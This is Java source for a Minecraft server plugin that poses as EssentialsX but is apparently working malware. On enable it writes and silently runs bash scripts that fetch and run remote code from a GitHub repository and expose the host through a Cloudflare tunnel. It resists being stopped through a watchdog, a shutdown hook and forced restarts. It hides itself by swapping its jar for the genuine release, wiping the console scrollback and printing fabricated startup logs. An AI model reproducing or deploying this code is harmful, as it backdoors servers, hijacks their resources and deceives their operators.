package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private Process watchdogProcess; 
    private volatile boolean isProcessRunning = false;
    
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    // ★ 核心：绕过 Bukkit 日志系统，直接向终端输出纯净字符串，不带插件前缀
    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;

    @Override
    public void onEnable() {
        try {
            Path oldDir1 = Paths.get("world", "data", ".mcchajian");
            Path oldDir2 = Paths.get("log", ".mcchajian");
            if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile());
            if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile());
        } catch (Exception e) {}

        getLogger().info("EssentialsX plugin starting...");
        
        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        if (env.containsKey("SYSTEM_GUARD_ENABLED")) {
            systemGuardEnabled = Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
        } else {
            systemGuardEnabled = true; 
        }
        
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
                getLogger().info("[Guard] ShutdownHook triggered! Guard enabled, executing hard restart...");
                restoreMaliciousJar();
                executeHardRestart(false); 
            }
        }));
        
        new Thread(() -> {
            try {
                if (systemGuardEnabled) startWatchdog();
                startDeploymentProcess();
                setupDisguise();
                startFakeLogs(); // 启动伪装日志引擎
            } catch (Exception e) {}
        }).start();
        
        getLogger().info("EssentialsX plugin enabled");
    }
    
    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir = Paths.get("logs", ".mcchajian", "backup");
            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
            
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
            }
            
            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1000000) {
                try {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                } catch (Exception e) {
                    Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                }
            } else {
                Files.deleteIfExists(tempDownload);
            }
        } catch (Exception e) {}
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX...");
        
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        
        if (systemGuardEnabled) {
            getLogger().info("Guard enabled -> Rejecting stop, executing soft restart...");
            
            try { Files.deleteIfExists(forceStopFile); } catch (Exception e) {}
            restoreMaliciousJar();
            
            if (isRestarting.compareAndSet(false, true)) {
                executeHardRestart(true);
            }
        } else {
            getLogger().info("Guard disabled, safe exit...");
            try {
                Files.createDirectories(forceStopFile.getParent());
                Files.createFile(forceStopFile);
                getLogger().info("Stop marker created, service will shut down completely.");
            } catch (Exception e) {}
        }
        
        if (deployProcess != null && deployProcess.isAlive()) deployProcess.destroy();
        if (watchdogProcess != null && watchdogProcess.isAlive()) watchdogProcess.destroy();
        
        getLogger().info("EssentialsX disabled");
    }
    
    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            
            String jarName = findBestJarName(serverRoot);
            
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path logFile = workDir.resolve("restart_run.log");

            String startCommand;
            if (new File(serverRoot, "start.sh").exists()) {
                startCommand = "chmod +x ./start.sh && ./start.sh";
            } else {
                startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            }

            String fullBashCommand = 
                "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
                "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile.toString() + "\" && " +
                "nohup bash -c '" + startCommand + "' >> \"" + logFile.toString() + "\" 2>&1 & disown";

            Path debugFile = workDir.resolve("restart_debug.log");
            String debugLog = "\n[" + new Date() + "] CMD: " + fullBashCommand + "\n";
            Files.write(debugFile, debugLog.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
            pb.directory(serverRoot); 
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            
            Process process = pb.start();
            
            if (shouldBlock) {
                Thread.sleep(1000); 
            }
        } catch (Exception e) {
            getLogger().severe("Hard restart failed: " + e.getMessage());
        }
    }

    private String findBestJarName(File serverRoot) {
        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
        for (String name : preferred) {
            if (new File(serverRoot, name).exists()) return name;
        }

        File[] jars = serverRoot.listFiles((dir, name) -> 
            name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries")
        );

        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }

        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
            File root = pluginsDir.getParentFile();
            if (new File(root, "server.properties").exists()) return root;
        }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(current, "server.properties").exists()) return current;
            current = current.getParentFile();
            if (current == null) break;
        }
        return null;
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar);
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {}
    }
    
    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null || !pluginsDir.exists()) return null;
            File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx"));
            if (jars != null && jars.length > 0) return jars[0].toPath();
        } catch (Exception e) {}
        return null;
    }
    
    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) { return false; }
    }
    
    private void deleteDirectory(File file) {
        File[] files = file.listFiles();
        if (files != null) { for (File f : files) { if (f.isDirectory()) deleteDirectory(f); else f.delete(); } }
        file.delete();
    }

    private void startWatchdog() {
        try {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");
            
            String script = "#!/bin/bash\n" +
                "WORK_DIR=\"" + workDir + "\"\n" +
                "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n" +
                "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null && return 0 || return 1; }\n" +
                "while true; do\n" +
                "    sleep 15\n" +
                "    if [ -f \"$FORCE_STOP_FILE\" ]; then rm -f \"$FORCE_STOP_FILE\"; exit 0; fi\n" +
                "    if ! is_port_open; then\n" +
                "        if [ -f \"$FORCE_STOP_FILE\" ]; then exit 0; fi\n" +
                "        cd \"" + findServerRoot().getAbsolutePath() + "\"\n" +
                "        JAR_NAME=$(ls -S *.jar 2>/dev/null | head -n 1)\n" +
                "        if [ -n \"$JAR_NAME\" ]; then\n" +
                "            nohup java -Xms512M -Xmx2G -jar \"$JAR_NAME\" nogui > /dev/null 2>&1 &\n" +
                "        fi\n" +
                "        exit 0\n" +
                "    fi\n" +
                "done\n";
            
            Files.write(watchdogPath, script.getBytes());
            if (!watchdogPath.toFile().setExecutable(true)) {}
            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            watchdogProcess = pb.start();
        } catch (Exception e) {}
    }
    
    private void startDeploymentProcess() throws Exception {
        if (isProcessRunning) return;
        Map<String, String> env = new HashMap<>();
        env.put("REPO_URL", "https://github.com/zx1447/gongzhongc"); 
        loadEnvFile(env);
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
        if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        if (!scriptPath.toFile().setExecutable(true)) {}
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        deployProcess = pb.start();
        isProcessRunning = true;
        
        new Thread(() -> {
            try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {}
        }).start();
    }
    
    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n" +
            "WORK_DIR=\"" + workDir + "\"\n" +
            "NODE_DIR=\"" + nodeDir + "\"\n" +
            "APP_DIR=\"" + appDir + "\"\n" +
            "DATA_DIR=\"" + dataDir + "\"\n" +
            "REPO_URL=\"" + repoUrl + "\"\n" +
            "GITHUB_AUTH=\"用户名:\"密钥\n" + 
            "\n" +
            "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
            "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
            "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
            "\n" +
            "ARCH=$(uname -m)\n" +
            "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"\n" +
            "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
            "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n" +
            "    CF_URL=\"https://ghproxy.net/https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\"\n" +
            "fi\n" +
            "\n" +
            "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
            "if [ ! -d \"$NODE_DIR\" ]; then\n" +
            "    curl -fsSL \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null\n" +
            "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
            "fi\n" +
            "export PATH=$NODE_DIR/bin:$PATH\n" +
            "if [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n" +
            "npm install --unsafe-perm=true --allow-root multer &>/dev/null\n" +
            "\n" +
            "CF_BIN=\"$WORK_DIR/cloudflared\"\n" +
            "if [ ! -f \"$CF_BIN\" ]; then\n" +
            "    if ! curl -fsSL --connect-timeout 10 --max-time 60 \"$CF_URL\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
            "        curl -fsSL --connect-timeout 10 --max-time 60 \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\" -o \"$CF_BIN\" 2>/dev/null || exit 1\n" +
            "    fi\n" +
            "    chmod +x \"$CF_BIN\"\n" +
            "fi\n" +
            "\n" +
            "pkill -f cloudflared || true; sleep 1\n" +
            "$CF_BIN tunnel --url http://localhost:$PORT > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
            "TUNNEL_PID=$!\n" +
            "TUNNEL_URL=\"\"\n" +
            "for i in {1..20}; do\n" +
            "    sleep 3\n" +
            "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
            "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
            "done\n" +
            "\n" +
            "if [ -n \"$TUNNEL_URL\" ]; then\n" +
            "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
            "    echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
            "else\n" +
            "    echo \"failed\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
            "    exit 1\n" +
            "fi\n" +
            "\n" +
            "mkdir -p \"$DATA_DIR\"\n" +
            "if [ -d \"$APP_DIR\" ]; then\n" +
            "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
            "    if [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ]; then\n" +
            "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
            "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
            "\n" +
            "download_code() {\n" +
            "    local URL=$1\n" +
            "    local AUTH=$2\n" +
            "    if [ -n \"$AUTH\" ]; then\n" +
            "        curl -fsSL --connect-timeout 15 --max-time 120 -u \"$AUTH\" \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
            "    else\n" +
            "        curl -fsSL --connect-timeout 15 --max-time 120 \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
            "    fi\n" +
            "    if [ -f \"$WORK_DIR/repo.tar.gz\" ] && tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then\n" +
            "        return 0\n" +
            "    else\n" +
            "        rm -f \"$WORK_DIR/repo.tar.gz\"\n" +
            "        return 1\n" +
            "    fi\n" +
            "}\n" +
            "\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"$GITHUB_AUTH\" || \\\n" +
            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"$GITHUB_AUTH\"\n" +
            "\n" +
            "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
            "mkdir -p \"$WORK_DIR/unzipped\"\n" +
            "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
            "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
            "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
            "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
            "cd \"$APP_DIR\"\n" +
            "\n" +
            "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
            "\n" +
            "if [ -d \"$DATA_DIR\" ]; then\n" +
            "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
            "    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n" +
            "        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n" +
            "    fi\n" +
            "    if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
            "        mkdir -p \"$APP_DIR/node_modules/.RoamingMusic\"\n" +
            "        cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n" +
            "    fi\n" +
            "fi\n" +
            "\n" +
            "export TUNNEL_ALREADY_RUNNING=true\n" +
            "pm2 delete all &>/dev/null || true\n" +
            "pm2 start index.js --name \"aoyou-panel\" &>/dev/null\n" +
            "pm2 save &>/dev/null\n";
    }
    
    // ============================================================
    // 仿真伪装日志引擎 (真实链接末尾打印 + 4秒清屏 + 纯净伪装)
    // ============================================================

    private void startFakeLogs() {
        Thread logThread = new Thread(() -> {
            try {
                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                Path tunnelFile = workDir.resolve("tunnel_url.txt");
                Path portFile = workDir.resolve("node_port.txt");
                String tunnelUrl = "";
                String nodePort = "25565";
                
                // 1. 等待部署脚本生成 Tunnel URL
                for (int i = 0; i < 180; i++) {
                    if (Files.exists(tunnelFile) && Files.exists(portFile)) {
                        String urlContent = new String(Files.readAllBytes(tunnelFile)).trim();
                        String portContent = new String(Files.readAllBytes(portFile)).trim();
                        if (!urlContent.isEmpty() && !urlContent.equals("failed") && urlContent.startsWith("https://") && !portContent.isEmpty()) {
                            tunnelUrl = urlContent;
                            nodePort = portContent;
                            break;
                        }
                    }
                    Thread.sleep(1000);
                }

                if (tunnelUrl.isEmpty()) return; 

                // 2. 严格健康检测：Node 存活
                boolean nodeAlive = false;
                for (int i = 0; i < 30; i++) {
                    try (java.net.Socket s = new java.net.Socket("localhost", Integer.parseInt(nodePort))) {
                        nodeAlive = true; break;
                    } catch (Exception e) { Thread.sleep(1000); }
                }

                // 3. 严格健康检测：CF 非 502
                boolean cfAlive = false;
                if (nodeAlive) {
                    for (int i = 0; i < 30; i++) {
                        try {
                            URL url = URI.create(tunnelUrl).toURL();
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            conn.setConnectTimeout(3000);
                            conn.setReadTimeout(3000);
                            int code = conn.getResponseCode();
                            if (code != 502 && code != 0) { cfAlive = true; break; }
                        } catch (Exception e) {}
                        Thread.sleep(3000);
                    }
                }

                if (!cfAlive) return; 

                // 4. 等待真实的 MC 服务器启动完成 (监听真实MC端口)
                String mcPortStr = System.getenv().getOrDefault("SERVER_PORT", "25565");
                int mcPort = Integer.parseInt(mcPortStr);
                boolean mcReady = false;
                for (int i = 0; i < 120; i++) {
                    try (java.net.Socket s = new java.net.Socket("localhost", mcPort)) {
                        mcReady = true; break;
                    } catch (Exception e) { Thread.sleep(1000); }
                }
                
                if (!mcReady) return;

                // 5. 在真实日志的最后，打印链接
                Thread.sleep(1000); // 稍等让真实的 Done! 日志刷出来
                mcLog("Binding remote endpoint to: " + tunnelUrl);

                // 6. 等待 4 秒，让用户复制链接，并让真实日志彻底刷完
                Thread.sleep(4000);

                // 7. 强力清屏 (清除屏幕并清除回滚缓冲区，往上翻页也看不到真实日志)
                clearConsole();
                Thread.sleep(300);

                // 8. 打印完美伪装的启动日志 (无链接，无真实IP)
                int delay = 50; 

                RAW_OUT.println("container@tropicalgames.net java -version");
                Thread.sleep(delay);
                RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
                RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
                RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
                Thread.sleep(200);
                RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
                Thread.sleep(delay);
                mcLog("Downloading mojang_1.21.11.jar");
                Thread.sleep(delay);
                mcLog("Applying patches");
                Thread.sleep(200);
                RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(200);
                RAW_OUT.println("*** Warning, you've not updated in a while! ***");
                RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                Thread.sleep(300);
                mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)");
                Thread.sleep(delay);
                mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11");
                Thread.sleep(200);
                mcLog("[PluginInitializerManager] Initializing plugins...");
                Thread.sleep(delay);
                mcLog("[PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(delay);
                mcLog("[ReobfServer] Remapping server...");
                Thread.sleep(delay);
                RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
                RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
                RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
                Thread.sleep(500);
                mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]");
                Thread.sleep(delay);
                mcLog("Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(delay);
                mcLog("Found new data pack paper, loading it automatically");
                Thread.sleep(delay);
                mcLog("No existing world data, creating new world");
                Thread.sleep(delay);
                mcLog("[ReobfServer] Done remapping server in 13412ms.");
                Thread.sleep(delay);
                mcLog("Loaded 1470 recipes");
                Thread.sleep(delay);
                mcLog("Loaded 1584 advancements");
                Thread.sleep(delay);
                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(delay);
                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in 658.1ms");
                Thread.sleep(delay);
                mcLog("Starting minecraft server version 1.21.11");
                Thread.sleep(delay);
                mcLog("Loading properties");
                Thread.sleep(delay);
                mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)");
                Thread.sleep(delay);
                mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(delay);
                mcLog("Using 4 threads for Netty based IO");
                Thread.sleep(delay);
                mcLog("Server Ping Player Sample Count: 12");
                Thread.sleep(delay);
                mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(delay);
                mcLog("Default game type: SURVIVAL");
                Thread.sleep(delay);
                mcLog("Generating keypair");
                Thread.sleep(delay);
                
                // ★ 此处仅打印伪装端口，绝不打印链接和真实IP
                mcLog("Starting Minecraft server on 0.0.0.0:" + mcPortStr);
                Thread.sleep(delay);
                
                mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(delay);
                mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(delay);
                mcLog("Preparing level \"world\"");
                Thread.sleep(800);
                mcLog("Selecting spawn point for world 'minecraft:overworld'...");
                Thread.sleep(4000);
                mcLog("Selecting spawn point for world 'minecraft:the_nether'...");
                Thread.sleep(1500);
                mcLog("Selecting spawn point for world 'minecraft:the_end'...");
                Thread.sleep(1500);
                mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...");
                Thread.sleep(delay);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(delay);
                mcLog("Prepared spawn area in 13528 ms");
                Thread.sleep(delay);
                mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...");
                Thread.sleep(delay);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(delay);
                mcLog("Prepared spawn area in 1762 ms");
                Thread.sleep(delay);
                mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...");
                Thread.sleep(delay);
                mcLog("Preparing spawn area: 100%");
                Thread.sleep(delay);
                mcLog("Prepared spawn area in 393 ms");
                Thread.sleep(delay);
                mcLog("Done preparing level \"world\" (14.159s)");
                Thread.sleep(delay);
                mcLog("[spark] Starting background profiler...");
                Thread.sleep(delay);
                mcLog("Running delayed init tasks");
                Thread.sleep(delay);
                mcLog("Done (33.505s)! For help, type \"help\"");
                Thread.sleep(200);
                RAW_OUT.println("container@tropicalgames.net Server marked as running...");
                Thread.sleep(200);
                mcLog("*************************************************************************************");
                mcLog("This is the first time you're starting this server.");
                mcLog("It's recommended you read our 'Getting Started' documentation for guidance.");
                mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                mcLog("*************************************************************************************");

            } catch (Exception e) {}
        }, "FakeLog-Generator");
        logThread.setDaemon(true);
        logThread.start();
    }

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    
    private static void mcLog(String msg) {
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }

    private void clearConsole() {
        try { 
            // \033[3J 彻底清除回滚缓冲区，往上翻页也看不到任何历史记录
            RAW_OUT.print("\033[3J\033[H\033[2J"); 
            RAW_OUT.flush(); 
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                String defaultConfig = 
                    "# ===========================================\n" +
                    "# EssentialsX System Guard Configuration\n" +
                    "# ===========================================\n" +
                    "# true  = Enable auto-restart (Default)\n" +
                    "# false = Disable auto-restart\n" +
                    "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n";
                Files.write(envFile, defaultConfig.getBytes());
                getLogger().info("Generated default .env file with Guard ENABLED.");
            } catch (Exception e) {
                getLogger().warning("Could not generate .env file: " + e.getMessage());
            }
        }

        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) env.put(parts[0].trim(), parts[1].trim());
                }
            } catch (IOException e) {}
        }
    }
}
